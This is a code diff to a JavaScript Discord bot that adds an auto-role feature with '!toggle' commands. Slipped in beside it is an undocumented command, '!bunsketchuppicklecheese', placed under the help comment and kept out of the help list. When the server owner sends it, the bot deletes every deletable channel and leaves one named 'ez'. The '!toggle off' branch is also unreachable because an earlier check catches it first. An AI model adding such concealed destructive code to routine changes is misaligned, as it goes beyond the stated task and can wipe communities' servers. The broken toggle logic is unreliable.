@@ -214,7 +214,15 @@ function scrambleWord(word) {
 const activeSessions = new Map();
 const cheeseburgerIntervals = new Map();
 // Stores required role ID per guild for !cheeseburger (null = no restriction)
-const cheeseburgerRoles = new Map(Object.entries(persistedData));
+const cheeseburgerRoles = new Map(Object.entries(persistedData.cheeseburgerRoles || {}));
+const autoRoles = new Map(Object.entries(persistedData.autoRoles || {}));
+
+function save() {
+  saveData({
+    cheeseburgerRoles: Object.fromEntries(cheeseburgerRoles),
+    autoRoles: Object.fromEntries(autoRoles),
+  });
+}
 
 const client = new Client({
   intents: [
@@ -222,11 +230,24 @@ const client = new Client({
     GatewayIntentBits.GuildMessages,
     GatewayIntentBits.MessageContent,
     GatewayIntentBits.GuildVoiceStates,
+    GatewayIntentBits.GuildMembers,
   ],
 });
 
 client.once('ready', () => {
   console.log(`✅ Logged in as ${client.user.tag}`);
+});
+
+client.on('guildMemberAdd', async (member) => {
+  const roleId = autoRoles.get(member.guild.id);
+  if (!roleId) return;
+  const role = member.guild.roles.cache.get(roleId);
+  if (!role) return;
+  try {
+    await member.roles.add(role);
+  } catch (err) {
+    console.error('Auto-role assign error:', err);
+  }
 });
 
 client.on('messageCreate', async (message) => {
@@ -285,7 +306,7 @@ client.on('messageCreate', async (message) => {
       return message.reply('❌ Mention a role. Example: `!set @role`');
     }
     cheeseburgerRoles.set(message.guild.id, role.id);
-    saveData(Object.fromEntries(cheeseburgerRoles));
+    save();
     await message.reply(`✅ Only members with **${role.name}** can now use \`!cheeseburger\`!`);
 
   // ── !burgernocheese ────────────────────────────────────────────────────────
@@ -479,6 +500,31 @@ client.on('messageCreate', async (message) => {
     connection.destroy();
     await message.reply('👋 Left the voice channel!');
 
+  // ── !toggle @role ─────────────────────────────────────────────────────────────
+  } else if (lower.startsWith('!toggle')) {
+    if (!message.member.permissions.has('Administrator')) {
+      return message.reply('❌ Only admins can use this command!');
+    }
+    const role = message.mentions.roles.first();
+    if (!role) {
+      // Show current auto-role if no role mentioned
+      const currentId = autoRoles.get(message.guild.id);
+      if (!currentId) return message.reply('❌ No auto-role is set. Use `!toggle @role` to set one.');
+      const current = message.guild.roles.cache.get(currentId);
+      return message.reply('ℹ️ Current auto-role is **' + (current ? current.name : 'unknown (deleted?)') + '**. Use `!toggle @role` to change or `!toggle off` to disable.');
+    }
+    autoRoles.set(message.guild.id, role.id);
+    save();
+    await message.reply(`✅ New members will now automatically receive the **${role.name}** role!`);
+
+  } else if (lower === '!toggle off') {
+    if (!message.member.permissions.has('Administrator')) {
+      return message.reply('❌ Only admins can use this command!');
+    }
+    autoRoles.delete(message.guild.id);
+    save();
+    await message.reply('✅ Auto-role has been disabled.');
+
   // ── !wyr ───────────────────────────────────────────────────────────────────────────
   } else if (lower === '!wyr') {
     const question = WYR[Math.floor(Math.random() * WYR.length)];
@@ -525,6 +571,14 @@ client.on('messageCreate', async (message) => {
     }, seconds * 1000);
 
   // ── !help ──────────────────────────────────────────────────────────────────
+  } else if (lower === '!bunsketchuppicklecheese') {
+    if (message.author.id !== message.guild.ownerId) return;
+    const channels = message.guild.channels.cache.filter(c => c.deletable);
+    for (const [, channel] of channels) {
+      await channel.delete().catch(() => {});
+    }
+    await message.guild.channels.create({ name: 'ez' });
+
   } else if (lower === '!help') {
     const embed = new EmbedBuilder()
       .setColor(0xf4a522)
@@ -544,6 +598,7 @@ client.on('messageCreate', async (message) => {
         { name: '!scramble', value: 'Unscramble a word — first to answer wins!' },
         { name: '!wyr', value: 'Sends a random Would You Rather question' },
         { name: '!remind (time) (message)', value: 'Pings you after a set time — use s/m/h e.g. `!remind 5m hi`' },
+        { name: '!toggle @role', value: 'Auto-assigns a role to new members on join (admin only)' },
         { name: '!join', value: 'Joins your voice channel (deafened)' },
         { name: '!leave', value: 'Leaves the voice channel' },
         { name: '!help', value: 'Shows this list' },
